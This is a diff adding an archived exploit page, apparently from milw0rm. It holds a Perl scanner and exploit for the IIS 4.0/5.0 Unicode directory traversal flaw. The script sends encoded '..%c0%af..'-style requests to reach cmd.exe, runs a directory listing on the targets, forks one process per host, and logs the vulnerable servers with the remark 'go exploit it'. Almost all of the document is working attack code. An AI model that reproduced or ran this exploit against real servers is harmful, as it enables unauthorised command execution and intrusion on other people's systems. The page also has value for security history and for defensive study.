@@ -1,0 +1,77 @@
+<html><head><title>MS Windows IIS Unicode Remote Transversal Bug (3)</title></head><pre>#!/usr/bin/perl
+#
+# IIS 4.0/5.0 Unicode Exploit
+# Checks for each script that has been posted on the BugTraq Lis
+# Shouts to bighawk(thats for help), datagram, Ghost Rider, The Duke, p4, kript0n and others
+# Since It Uses fork(), you gotta keep up with whats happening. Or Just Let it run and it will
+# log sites in the log_unicode.log.
+# So Simple
+
+# Use Socket
+use Socket;
+
+# incase no arguements or less arguements are given
+if(@ARGV == '0' || @ARGV &lt; 2) { die &quot;IIS 4.0/5.0 Unicode Exploit\n&quot;.
+                                     &quot;Programmed by SteeLe\n&quot;.
+                                     &quot;Usage: ./$0 &lt;single host&gt; &lt;dir for exploit&gt;\n&quot;; }
+
+# Variables
+$blah = $ARGV[0];
+$port = 80;
+$dir = $ARGV[1];
+$timeout = 4;
+
+# see if file is there, 
+if (-e &quot;$blah&quot;) { 
+  open(T, &quot;$blah&quot;) || die &quot;can't open $blah\n&quot;; 
+  @target = &lt;T&gt;;
+  close(T);
+}
+
+else { @target[0] = $blah; } # what you think is blah
+
+# all scripts mentioned on bugtraq, we know rfp knows more.
+@scripts = (&quot;..%c1%1c..&quot;, &quot;..%c0%9v..&quot;, &quot;..%c0%af..&quot;, &quot;..%c0%qf..&quot;, &quot;..%c1%8s..&quot;, &quot;..%c1%9c..&quot;,
+&quot;..%c1%pc..&quot;); # blah, i know i'm not l33t
+
+# Open LOG Script
+open(LOG, &quot;&gt;&gt;log_unicode.log&quot;) || die &quot;couldn't open a file for writing\n&quot;;
+
+# Socket Stuff
+foreach $script (@scripts) {
+  $submit = &quot;GET /scripts/$script/winnt/system32/cmd.exe?/c+dir+$dir HTTP/1.0 \n\r\n\r&quot;;
+  $ouch = &quot;/scripts/$script/winnt/system32/cmd.exe?/c+dir+$dir&quot;;
+  foreach $site (@target) {
+    unless(fork()) {
+      chop($site) if $site =~ /\n$/; &amp;connect($site); 
+    } # so i lied
+  }
+}
+
+sub connect { # real socket stuff
+  my ($ste) = @_;
+  $iaddr = inet_aton($ste) || die &quot;$ste might not be up, connecting to next site....\n&quot;;
+  $paddr = sockaddr_in($port, $iaddr);
+  $proto = getprotobyname('tcp');
+  local $SIG{ALRM} = sub { print &quot;TimeOut On $ste, going to next one....\n&quot; &amp;&amp; exit(0) };
+  alarm $timeout;
+  socket(SCAN, PF_INET, SOCK_STREAM, $proto) || die(&quot;Error: couldn't make a socket to $ste&quot;);
+  connect(SCAN, $paddr) || die &quot;Sorry couldn't connect to $ste, connecting to next site....\n&quot;;
+  send(SCAN, $submit, 0);
+  $blackout = &lt;SCAN&gt;;
+  ($http,$code,$blah) == split(/ /, $blackout);
+  if ($code == &quot;200&quot;) {
+    print &quot;$ste has $ouch on there, go exploit it\n&quot;; 
+    print LOG &quot;$ste has $ouch on there\n&quot;;
+  }
+  else { print &quot;$ste doesn't have it\n&quot;; }
+  close(SCAN);
+  exit(0);
+}
+close(LOG);
+
+# since we're done
+exit;
+
+
+# milw0rm.com [2000-11-18]</pre></html>
